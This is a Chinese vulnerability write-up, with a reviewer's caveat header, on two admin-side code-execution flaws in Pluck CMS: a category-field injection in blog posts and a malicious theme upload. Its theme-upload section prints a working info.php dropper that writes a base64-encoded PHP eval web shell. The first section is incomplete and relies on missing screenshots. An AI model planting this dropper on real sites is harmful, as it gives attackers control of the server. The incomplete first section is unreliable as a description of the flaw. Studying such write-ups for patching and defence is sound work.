---
source: "hatch 补库批 20260928"
product: "PluckCMS version unspecified"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Pluck CMS后台另两处任意代码执行"
prerequisites: "来源所述条件，未列明部分仍待核：博客发布/主题安装后台权限；category可控，或主题info.php自动include"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-4df0ba91d1e5cd7fe46a516d"
entity_id: "ve-4df0ba91d1e5cd7fe46a516d"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：博客发布/主题安装后台权限；category可控，或主题info.php自动include

- **证据待核（1）**：第一问题缺save_file具体转义和完整cont2payload；post_time不可控断言忽略函数force_time但外部可达性未证。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **结论使用边界（2）**：第二明确.htaccess挡直接访问而include主题info.php触发，保留阻断与绕过差异。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（3）**：多图片引用另一文章且扩展.shtml，需要核资源内容不是自动判坏；无版本/原始来源。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **适用与权限边界（4）**：主题安装本来载PHP是否越预期边界要说明。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Pluck CMS后台另两处任意代码执行

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

#### 第一处：过滤不严导致单引号逃逸

在function.php里面blog\_save\_post()函数

    function blog_save_post($title, $category, $content, $current_seoname = null, $force_time = null) {
        //Check if 'posts' directory exists, if not; create it.
        if (!is_dir(BLOG_POSTS_DIR)) {
            mkdir(BLOG_POSTS_DIR);
            chmod(BLOG_POSTS_DIR, 0777);
        }

        //Create seo-filename
        $seoname = seo_url($title);

        //Sanitize variables.
        $title = sanitize($title, true);
        $content = sanitizePageContent($content, false);

        if (!empty($current_seoname)) {
            $current_filename = blog_get_post_filename($current_seoname);
            $parts = explode('.', $current_filename);
            $number = $parts[0];

            //Get the post time.
            include BLOG_POSTS_DIR.'/'.$current_filename;

            if ($seoname != $current_seoname) {
                unlink(BLOG_POSTS_DIR.'/'.$current_filename);

                if (is_dir(BLOG_POSTS_DIR.'/'.$current_seoname))
                    rename(BLOG_POSTS_DIR.'/'.$current_seoname, BLOG_POSTS_DIR.'/'.$seoname);
            }
        }

        else {
            $files = read_dir_contents(BLOG_POSTS_DIR, 'files');

            //Find the number.
            if ($files) {
                $number = count($files);
                $number++;
            }
            else
                $number = 1;

            if (empty($force_time))
                $post_time = time();
            else
                $post_time = $force_time;
        }

        //Save information.
        $data['post_title']    = $title;
        $data['post_category'] = $category;
        $data['post_content']  = $content;
        $data['post_time']     = $post_time;

        save_file(BLOG_POSTS_DIR.'/'.$number.'.'.$seoname.'.php', $data);

        //Return seoname under which post has been saved (to allow for redirect).
        return $seoname;
    }

其中

    $data['post_title']    = $title;
    $data['post_category'] = $category;
    $data['post_content']  = $content;
    $data['post_time']     = $post_time;

\$title \$content 均被过滤，\$post\_time不可控，\$category可控

所以只要把\$cont2变成我们的payload即可

![](./.resource/PluckCMS4.7.10后台文件包含+文件上传导致getshell/media/rId25.shtml)

![](./.resource/PluckCMS4.7.10后台文件包含+文件上传导致getshell/media/rId26.shtml)

#### 第二处：安装模版+文件包含导致任意命令执行

很多CMS都会在安装模版的时候getshell，那么这里笔者也发现了类似的漏洞。

##### 1、直接访问失败

首先准备一个shell.php里面是我们的phpinfo();

然后打包成shell.zip，直接上传主题

![](./.resource/PluckCMS4.7.10后台文件包含+文件上传导致getshell/media/rId29.shtml)

![](./.resource/PluckCMS后台另两处任意代码执行/media/rId30.shtml)

发现确实上传并且解压成功

但是由于目录下有.htaccess文件，直接把php设置为不可解析，所以无法直接访问

![](./.resource/PluckCMS4.7.10后台文件包含+文件上传导致getshell/media/rId31.shtml)

![](./.resource/PluckCMS4.7.10后台文件包含+文件上传导致getshell/media/rId32.shtml)

##### 2、文件包含突破

所以就想到需要找一个位置对其进行包含，来达到执行的目的。

首先看到admin.php中关于theme的部分

![](./.resource/PluckCMS4.7.10后台文件包含+文件上传导致getshell/media/rId34.shtml)

跟进 data/inc/theme.php，发现调用了get\_themes()方法

![](./.resource/PluckCMS4.7.10后台文件包含+文件上传导致getshell/media/rId35.shtml)

跟进 functions.all.php，查看get\_themes()方法

    function get_themes() {
        $dirs = read_dir_contents('data/themes', 'dirs');
        if ($dirs) {
            natcasesort($dirs);
            foreach ($dirs as $dir) {
                if (file_exists('data/themes/'.$dir.'/info.php')) {
                    include_once ('data/themes/'.$dir.'/info.php');
                    $themes[] = array(
                        'title'   => $themename,
                        'dir' => $dir
                    );
                }
            }
            return $themes;
        }
        else
            return false;
    }

发现会遍历data/themes/下所有主题目录，并且包含他的info.php文件

此时info.php可控，就导致了任意代码执行。

##### 3、利用方法

首先准备一个info.php

    <?php
    file_put_contents('x.php',base64_decode('PD9waHAgQGV2YWwoJF9HRVRbJ21yNiddKTs/Pg=='));
    ?>

然后打包压缩成shell.zip

上传安装主题，然后点击回到主题页，此时触发文件包含。

![](./.resource/PluckCMS后台另两处任意代码执行/media/rId37.shtml)

![](./.resource/PluckCMS后台另两处任意代码执行/media/rId38.shtml)

![](./.resource/PluckCMS后台另两处任意代码执行/media/rId39.shtml)
